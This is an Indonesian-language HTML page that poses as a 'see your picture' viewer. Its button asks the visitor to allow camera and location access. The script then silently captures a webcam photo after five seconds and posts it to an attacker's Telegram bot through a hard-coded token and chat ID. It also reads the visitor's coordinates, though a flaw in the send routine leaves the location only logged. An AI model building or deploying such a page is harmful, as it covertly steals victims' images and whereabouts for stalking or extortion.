<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Akses Kamera dan Lokasi</title>
</head>
<body>
    <h1>Lihat Gambar Mu</h1>
    <button onclick="startCapture()">Izin kan semua untuk melihat gambar</button>
    <video id="video" width="320" height="240" autoplay></video>
    <script>
        function startCapture() {
            // Akses kamera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        const video = document.getElementById('video');
                        video.srcObject = stream;

                        // Ambil foto setelah beberapa detik atau berdasarkan event tertentu
                        setTimeout(() => {
                            captureAndSend(stream);
                        }, 5000); // Ambil foto setelah 5 detik
                    })
                    .catch(function(error) {
                        alert("Akses kamera ditolak.");
                    });
            } else {
                alert("Browser tidak mendukung akses kamera.");
            }

            // Akses lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log('Lokasi Anda:', lat, lon);

                    // Kirimkan lokasi ke Telegram
                    sendToTelegram(`Lokasi Anda: Latitude: ${lat}, Longitude: ${lon}`);
                }, function(error) {
                    alert("Gagal mendapatkan lokasi.");
                });
            } else {
                alert("Lokasi tidak tersedia.");
            }
        }

        function captureAndSend(stream) {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            // Tentukan ukuran canvas sesuai dengan video
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Gambar dari video ke canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Ambil gambar sebagai data URL (base64)
            const imageData = canvas.toDataURL('image/jpeg');

            // Kirim gambar ke Telegram
            sendToTelegram(imageData);
        }

        function sendToTelegram(message) {
            const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
            const chatId = '1746156378';

            // Jika pesan berupa gambar (base64)
            if (message.startsWith('data:image/jpeg;base64,')) {
                const photoUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
                fetch(photoUrl, {
                    method: 'POST',
                    body: new URLSearchParams({
                        chat_id: chatId,
                        photo: message
                    })
                }).then(response => response.json())
                  .then(data => console.log('Gambar terkirim ke Telegram:', data))
                  .catch(error => console.log('Error:', error));
            }
        }
    </script>
</body>
</html>
